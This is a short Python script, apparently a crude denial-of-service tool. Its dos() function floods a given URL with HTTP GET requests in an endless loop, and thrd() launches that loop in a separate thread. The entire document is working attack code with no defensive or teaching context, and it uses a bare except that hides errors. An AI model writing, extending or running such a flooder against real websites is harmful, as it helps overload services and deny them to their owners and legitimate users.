def dos(url):
    from requests import get
    while True:
        try:
            _=get(url)
            print("Connection is established!")
        except:
            print('Connection error!')
def thrd(thrdItr,url):
    from threading import Thread
    Thread(target=dos,args=(url,)).start()    
